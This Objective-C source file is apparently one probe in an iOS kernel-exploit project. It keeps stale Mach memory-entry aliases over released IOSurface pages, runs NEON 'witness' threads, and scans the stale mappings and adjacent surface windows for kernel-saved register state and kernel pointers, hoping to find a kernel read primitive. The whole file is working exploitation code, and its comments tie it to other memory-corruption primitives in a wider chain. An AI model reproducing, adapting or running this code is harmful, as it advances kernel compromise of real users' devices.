//
//  P180NeonStackAlias.m — the P102-canary -> NEON bridge test. v1.
//
//  THE QUESTION (2026-11-22): P102's canary always lands in DRAM, never in
//  the IORVBAR window — because the GPU MapMemory door returns the
//  unimplemented-stub code on every type (the G11G decode). So can that
//  surface machinery connect to the NEON channel at all? And can cs2's
//  hits connect to it?
//
//  THE ONLY BRIDGE THAT COULD EXIST: a physical alias. A memory entry made
//  over a PurpleGfxMem surface base survives CFRelease of the surface and
//  keeps naming the physical pages (corpus: iosurface-stale-page-race,
//  measured on 27.0/27.0.1). If one of those pages is ever handed to a
//  THREAD's kernel save area, our stale mapping would show the thread's
//  NEON register image — KERNEL REGISTER STATE READABLE WITH NO WRITE.
//  Every prior measurement used app/Metal churn. Nobody ever asked the
//  carveout for a thread save buffer.
//
//  WHY cs2 CANNOT BE THE BRIDGE: a cs2 hit is an ADDRESS (inpcb/socket
//  candidate) found by the OOB-read scan, not a corruption detector, and
//  inpcb/socket structs carry no thread pointer. If cs2 ESTABLISHES, it is
//  already kread/kwrite and NEON is redundant; NEON matters exactly when
//  cs2 misses (the current state on both trains).
//
//  THIS TAP:
//    P1  batch A: 64 PurpleGfxMem surfaces (0x4000, CacheMode 0x100 — the
//        P102-proven recipe) + a memory entry over each base + an alias
//        mapping + a per-slot A marker.
//    P2  arm 32 NEON witness threads whose v0..v31 carry
//        0x4e45_0000_<wid>_<q>; the kernel saves them on every preemption.
//    P3  release A, create batch B (the SAME size/region) with per-slot B
//        markers -> CONTROL: do the stale aliases show B's content? That
//        is the corpus-proven carveout recycle. Scan the aliases for the
//        NEON magic while we are there.
//    P4  THE P159 LOTTERY (v2): the proven scanner (33%/round on 23F77)
//        retargeted at the NEON magic — 16 rounds x 50 default-region
//        surfaces, a delta-0x4000 VA adjacency, then a 0x10000 read-only
//        scan from the second base (the Rust505 technique). This is the
//        "is P159 usable with NEON" answer: P159's window is a repeatable
//        KERNEL-WINDOW READER; the NEON magic is the target pattern that
//        turns it from a kptr lottery into a thread-save-buffer detector.
//    P5  verdict. PANIC-FREE. Never sets hasKread.
//

#import "P180NeonStackAlias.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <CoreFoundation/CoreFoundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <mach/vm_map.h>
#import <pthread.h>
#import <setjmp.h>
#import <signal.h>
#import <string.h>
#import <unistd.h>

#define P180_BUILD   @"p180-neon-stack-alias-v2-p159"
#define P180_N       64
#define P180_SIZE    0x4000
#define P180_WITNESS 32

/* local prototypes (the P069 pattern — never import mach_vm.h) */
kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address,
                          mach_vm_size_t size, mach_vm_offset_t mask, int flags,
                          mem_entry_name_port_t object, memory_object_offset_t offset,
                          boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection,
                          vm_inherit_t inheritance);
kern_return_t mach_make_memory_entry_64(vm_map_t target_task,
                                        memory_object_size_t *size,
                                        memory_object_offset_t offset,
                                        vm_prot_t permission,
                                        mem_entry_name_port_t *object_handle,
                                        mem_entry_name_port_t parent_handle);

typedef void *(*p180_create_t)(CFDictionaryRef);
typedef void *(*p180_base_t)(void *);
typedef size_t (*p180_alloc_t)(void *);

#define P180_A_PREFIX 0x4131383000000000ULL   /* "A180" | slot<<8 | 0xA1 */
#define P180_B_PREFIX 0x4231383000000000ULL   /* "B180" | slot<<8 | 0xB2 */
#define P180_B_MASK   0xFFFFFF0000000000ULL
#define P180_NEON     0x4E45000000000000ULL   /* the P044 magic prefix */
#define P180_NEON_MASK 0xFFFF000000000000ULL

typedef struct {
    void *surf;                       /* IOSurfaceRef (released in P2) */
    mem_entry_name_port_t entry;
    mach_vm_address_t alias;
    int hadA;
} p180_slot_t;

static p180_slot_t g_p180[P180_N];
static void *g_p180_b[P180_N];

static volatile int g_p180_quit;
static uint64_t g_p180_magic[P180_WITNESS][64] __attribute__((aligned(16)));

static sigjmp_buf g_p180_jmp;
static volatile sig_atomic_t g_p180_faulted;

static void p180_fault(int sig, siginfo_t *si, void *uc) {
    (void)sig; (void)si; (void)uc;
    g_p180_faulted = 1;
    siglongjmp(g_p180_jmp, 1);
}

static void *p180_witness_fn(void *arg) {
    int k = (int)(intptr_t)arg;
    uint64_t *m = g_p180_magic[k];
    while (!g_p180_quit) {
        __asm__ volatile(
            "ld1 {v0.2d, v1.2d, v2.2d, v3.2d}, [%0], #64   \n"
            "ld1 {v4.2d, v5.2d, v6.2d, v7.2d}, [%0], #64   \n"
            "ld1 {v8.2d, v9.2d, v10.2d, v11.2d}, [%0], #64 \n"
            "ld1 {v12.2d, v13.2d, v14.2d, v15.2d}, [%0], #64\n"
            "ld1 {v16.2d, v17.2d, v18.2d, v19.2d}, [%0], #64\n"
            "ld1 {v20.2d, v21.2d, v22.2d, v23.2d}, [%0], #64\n"
            "ld1 {v24.2d, v25.2d, v26.2d, v27.2d}, [%0], #64\n"
            "ld1 {v28.2d, v29.2d, v30.2d, v31.2d}, [%0]    \n"
            :
            : "r"(m)
            : "v0","v1","v2","v3","v4","v5","v6","v7",
              "v8","v9","v10","v11","v12","v13","v14","v15",
              "v16","v17","v18","v19","v20","v21","v22","v23",
              "v24","v25","v26","v27","v28","v29","v30","v31", "memory");
        for (volatile int s = 0; s < 128; s++) __asm__ volatile("nop");
    }
    return NULL;
}

@implementation P180NeonStackAlias

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    int fd = open([[docs stringByAppendingPathComponent:
                    @"p180_neon_stack_alias_log.txt"] UTF8String],
                  O_CREAT | O_WRONLY | O_TRUNC, 0644);
    void (^L)(NSString *) = ^(NSString *s) {
        NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
        [log appendString:out];
        if (fd >= 0) { const char *p = out.UTF8String; if (p) write(fd, p, strlen(p)); }
    };

    L([NSString stringWithFormat:@"=== p180 session %@ BUILD %@ ===",
       LabLocalMilitaryNow() ?: @"?", P180_BUILD]);
    L(@"THE P102-canary -> NEON bridge test: can a PurpleGfxMem surface page");
    L(@"become a thread's NEON save buffer (a stale memory entry = a kread");
    L(@"with NO write)? PANIC-FREE. hasKread unchanged.");
    L([LabDeviceProfile identBlock] ?: @"ident=?");

    memset(g_p180, 0, sizeof g_p180);
    memset(g_p180_b, 0, sizeof g_p180_b);

    /* ── the IOSurface entry points (the P102 recipe) ── */
    void *ios = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!ios) ios = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    p180_create_t pCreate = ios ? (p180_create_t)dlsym(ios, "IOSurfaceCreate") : NULL;
    p180_base_t pBase = ios ? (p180_base_t)dlsym(ios, "IOSurfaceGetBaseAddress") : NULL;
    p180_alloc_t pAlloc = ios ? (p180_alloc_t)dlsym(ios, "IOSurfaceGetAllocSize") : NULL;
    if (!pCreate || !pBase) {
        L(@"[-] IOSurface entry points absent — nothing to test on this build");
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }

    void *(^mkSurf)(int64_t, CFStringRef, int64_t) = ^void *(int64_t bytes, CFStringRef region, int64_t mode) {
        CFNumberRef nSz = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &bytes);
        CFNumberRef nMode = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &mode);
        CFMutableDictionaryRef d = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(d, CFSTR("IOSurfaceAllocSize"), nSz);
        CFDictionarySetValue(d, CFSTR("IOSurfaceMemoryRegion"), region);
        CFDictionarySetValue(d, CFSTR("IOSurfaceCacheMode"), nMode);
        void *s = pCreate(d);
        CFRelease(nSz); CFRelease(nMode); CFRelease(d);
        return s;
    };

    /* ── P1: batch A — surfaces + entries + stale aliases ── */
    int aMade = 0, aEntry = 0, aMapped = 0, aMarked = 0;
    for (int i = 0; i < P180_N; i++) {
        void *surf = mkSurf(P180_SIZE, CFSTR("PurpleGfxMem"), 0x100);
        if (!surf) continue;
        aMade++;
        void *base = pBase(surf);
        size_t asz = pAlloc ? pAlloc(surf) : 0;
        if (!base || asz < 0x20) { CFRelease(surf); continue; }

        uint64_t a = P180_A_PREFIX | ((uint64_t)i << 8) | 0xA1ULL;
        *(volatile uint64_t *)base = a;
        *((volatile uint64_t *)base + 1) = ~a;
        *(volatile uint64_t *)((uintptr_t)base + asz - 8) = a;
        aMarked++;

        memory_object_size_t esz = (memory_object_size_t)asz;
        mem_entry_name_port_t entry = 0;
        kern_return_t ekr = mach_make_memory_entry_64(mach_task_self(), &esz,
            (memory_object_offset_t)(uintptr_t)base, VM_PROT_DEFAULT, &entry, 0);
        if (ekr != KERN_SUCCESS || !entry) { CFRelease(surf); continue; }
        aEntry++;

        mach_vm_address_t va = 0;
        kern_return_t mkr = mach_vm_map(mach_task_self(), &va, asz, 0, 1,
                                        entry, 0, false,
                                        VM_PROT_READ | VM_PROT_WRITE,
                                        VM_PROT_READ | VM_PROT_WRITE,
                                        VM_INHERIT_NONE);
        if (mkr != KERN_SUCCESS || !va) {
            mach_port_deallocate(mach_task_self(), entry);
            CFRelease(surf);
            continue;
        }
        aMapped++;
        g_p180[i].surf  = surf;
        g_p180[i].entry = entry;
        g_p180[i].alias = va;
        g_p180[i].hadA  = (*(volatile uint64_t *)va == a);
    }
    L([NSString stringWithFormat:@"[P1] batch A: create=%d marked=%d entry=%d "
       @"alias=%d of %d (0x%x B each, PurpleGfxMem/CacheMode 0x100)",
       aMade, aMarked, aEntry, aMapped, P180_N, P180_SIZE]);
    if (aMapped == 0) {
        L(@"[-] no stale aliases — the bridge test cannot run (honest)");
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }

    /* ── P2: arm the 32 NEON witnesses FIRST (every scan below can then see
       the magic — the kernel saves v0..v31 on every preemption). ── */
    pthread_t wth[P180_WITNESS];
    int wStarted = 0;
    g_p180_quit = 0;
    for (int k = 0; k < P180_WITNESS; k++) {
        for (int q = 0; q < 64; q++)
            g_p180_magic[k][q] = P180_NEON | ((uint64_t)k << 32) | (uint64_t)q;
        if (pthread_create(&wth[k], NULL, p180_witness_fn, (void *)(intptr_t)k) == 0)
            wStarted++;
        else
            wth[k] = 0;
    }
    L([NSString stringWithFormat:@"[P2] NEON witnesses armed: %d/%d (the kernel "
       @"saves v0..v31 on every preemption; the magic is 0x4e45_0000_<wid>_<q>)",
       wStarted, P180_WITNESS]);
    usleep(80000);   /* let every witness cycle the save/restore path */

    /* ── P3: release A, create B -> the CONTROL (carveout recycle) + the
       stale-alias magic scan. ── */
    for (int i = 0; i < P180_N; i++) {
        if (g_p180[i].surf) { CFRelease((CFTypeRef)g_p180[i].surf); g_p180[i].surf = NULL; }
    }
    int bMade = 0, bMarked = 0;
    for (int i = 0; i < P180_N; i++) {
        void *surf = mkSurf(P180_SIZE, CFSTR("PurpleGfxMem"), 0x100);
        if (!surf) continue;
        bMade++;
        void *base = pBase(surf);
        if (!base) { CFRelease(surf); continue; }
        uint64_t b = P180_B_PREFIX | ((uint64_t)i << 8) | 0xB2ULL;
        *(volatile uint64_t *)base = b;
        *((volatile uint64_t *)base + 1) = ~b;
        g_p180_b[i] = surf;
        bMarked++;
    }
    L([NSString stringWithFormat:@"[P3] batch B: create=%d marked=%d "
       @"(A released first — the recycle window)", bMade, bMarked]);

    int recycleAliases = 0;
    uint64_t recycleFirst = 0;
    uint64_t neonFirst = 0, neonAt = 0, kptrFirst = 0;
    for (int i = 0; i < P180_N; i++) {
        if (!g_p180[i].alias) continue;
        volatile uint64_t *p = (volatile uint64_t *)g_p180[i].alias;
        size_t n = P180_SIZE / 8;
        int hit = 0;
        for (size_t q = 0; q < n; q++) {
            uint64_t v = p[q];
            if ((v & P180_B_MASK) == P180_B_PREFIX) { hit = 1; if (!recycleFirst) recycleFirst = v; }
            if ((v & P180_NEON_MASK) == P180_NEON && !neonFirst) { neonFirst = v; neonAt = (uint64_t)i; }
            if (((v >> 40) == 0xFFFFFEULL || (v >> 40) == 0xFFFFFFULL) && !kptrFirst) kptrFirst = v;
        }
        if (hit) recycleAliases++;
    }
    L([NSString stringWithFormat:@"[P3] CONTROL recycle: %d/%d stale aliases "
       @"now hold a B marker%@", recycleAliases, aMapped,
       recycleAliases ? @" — the carveout REUSED pages (the corpus law reproduces here)"
                      : @" — no recycle seen; the thread test below is INCONCLUSIVE, not a negative"]);

    /* ── P4: THE P159 LOTTERY — the proven scanner (33%/round on 23F77)
       retargeted at the NEON magic. Create 50 default-region surfaces, find
       a delta-0x4000 VA adjacency, scan 0x10000 from the second base (the
       Rust505 technique, read-only). Any 0x4e45 magic in the window = the
       save area is reachable through a window we can read. ── */
    struct sigaction sa, old_segv, old_bus;
    memset(&sa, 0, sizeof sa);
    sa.sa_sigaction = p180_fault;
    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, &old_segv);
    sigaction(SIGBUS, &sa, &old_bus);

    int lotRounds = 0, lotAdj = 0, lotKptr = 0;
    uint64_t lotNeon = 0, lotNeonOff = 0;
    CFDictionaryRef props159 = (__bridge CFDictionaryRef)@{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4,
        @"IOSurfacePixelFormat": @0x42475241,
    };
    for (int round = 0; round < 16 && !neonFirst && !lotNeon; round++) {
        void *surfs[50]; uintptr_t bases[50]; int n = 0;
        for (int i = 0; i < 50; i++) {
            void *s2 = pCreate(props159);
            if (!s2) continue;
            void *b = pBase(s2);
            if (!b) { CFRelease((CFTypeRef)s2); continue; }
            surfs[n] = s2; bases[n] = (uintptr_t)b; n++;
        }
        int idx = -1;
        for (int i = 0; i < n - 1; i++) {
            if (bases[i] && bases[i + 1] && bases[i + 1] - bases[i] == 0x4000) {
                idx = i; break;
            }
        }
        if (n < 2) { for (int i = 0; i < n; i++) CFRelease((CFTypeRef)surfs[i]); continue; }
        if (idx < 0) {
            for (int i = 0; i < n; i++) CFRelease((CFTypeRef)surfs[i]);
            continue;
        }
        lotAdj++;
        uintptr_t b2 = bases[idx + 1];
        for (uintptr_t addr = b2; addr < b2 + 0x10000; addr += 8) {
            uint64_t v = 0;
            g_p180_faulted = 0;
            if (sigsetjmp(g_p180_jmp, 1) == 0) {
                v = *(volatile uint64_t *)addr;
            } else {
                break;
            }
            if (!v) continue;
            if ((v & P180_NEON_MASK) == P180_NEON) {
                lotNeon = v; lotNeonOff = (uint64_t)(addr - b2);
                break;
            }
            if ((v >> 40) == 0xFFFFFEULL || (v >> 40) == 0xFFFFFFULL) lotKptr++;
        }
        for (int i = 0; i < n; i++) CFRelease((CFTypeRef)surfs[i]);
        lotRounds++;
    }
    sigaction(SIGSEGV, &old_segv, NULL);
    sigaction(SIGBUS, &old_bus, NULL);
    L([NSString stringWithFormat:@"[P4] P159 lottery: rounds=%d adjacency=%d "
       @"kernel-shaped=%d neon=%@ (the proven scanner, retargeted at the magic)",
       lotRounds, lotAdj, lotKptr,
       lotNeon ? [NSString stringWithFormat:@"*** HIT 0x%016llx at +0x%llx ***",
                  (unsigned long long)lotNeon, (unsigned long long)lotNeonOff]
               : @"none"]);

    g_p180_quit = 1;
    for (int k = 0; k < P180_WITNESS; k++)
        if (wth[k]) pthread_join(wth[k], NULL);

    if (!neonFirst && lotNeon) { neonFirst = lotNeon; neonAt = lotNeonOff; }

    L([NSString stringWithFormat:@"[P4] TEST neon (stale aliases): %@", neonFirst
        ? [NSString stringWithFormat:@"*** HIT — a window we can read holds the "
           @"NEON magic 0x%016llx (slot/off %llu): KERNEL REGISTER STATE "
           @"READABLE WITH NO WRITE ***", (unsigned long long)neonFirst,
           (unsigned long long)neonAt]
        : @"no NEON magic in any alias or lottery window this tap"]);
    L([NSString stringWithFormat:@"[P4] kernel-shaped qwords in the aliases: %@",
       kptrFirst ? [NSString stringWithFormat:@"YES first=0x%016llx (informational)",
                    (unsigned long long)kptrFirst]
                 : @"none"]);

    /* ── P5: verdict ── */
    L(@"");
    L(@"=== VERDICT ===");
    if (neonFirst) {
        L(@"[+] THE BRIDGE EXISTS: a thread save area was reachable through a "
          @"window we can read (the stale alias or the P159 lottery). That is a "
          @"KERNEL REGISTER-READ channel with no write primitive — pair it with "
          @"the NEON transport and the A6 count sweep. hasKread still flips "
          @"ONLY via kread32(kbase).");
    } else if (recycleAliases > 0 || lotAdj > 0) {
        L([NSString stringWithFormat:@"[-] NEGATIVE ON THIS BUILD: the scanners "
           @"ran (recycle=%d/%d, lottery adjacency=%d) and saw kernel-shaped "
           @"data — but never the NEON magic. The thread save buffer does not "
           @"land in these pools: the P102 canary does NOT connect to NEON.",
           recycleAliases, aMapped, lotAdj]);
    } else {
        L(@"[=] INCONCLUSIVE: neither scanner got a window on this build "
          @"(no recycle, no adjacency) — the thread question was never asked. "
          @"Re-run where the CONTROL hits (the corpus measured 27.0/27.0.1).");
    }
    L(@"cs2 note: a cs2 hit is an inpcb/socket ADDRESS, not a corruption "
      @"detector, and inpcb/socket carry no thread pointer — so cs2 hits "
      @"cannot point at a NEON save buffer. If cs2 establishes, it is already "
      @"kread and NEON is redundant; NEON exists for the cs2-miss case.");
    L([NSString stringWithFormat:@"PANIC-FREE. hasKread=%@ unchanged.",
       [P007Board shared].hasKread ? @"YES" : @"NO"]);

    /* ── teardown (aliases stay mapped until exit — no need to unmap) ── */
    for (int i = 0; i < P180_N; i++) {
        if (g_p180_b[i]) CFRelease((CFTypeRef)g_p180_b[i]);
        if (g_p180[i].entry) mach_port_deallocate(mach_task_self(), g_p180[i].entry);
    }

    [[P007Board shared] recordEvent:@"p180_neon_stack_alias"
                                 kind:@"alias"
                               detail:[NSString stringWithFormat:
                                       @"recycle=%d neon=%d", recycleAliases,
                                       neonFirst ? 1 : 0]
                               source:@"p180"];
    if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
    return log;
}

@end
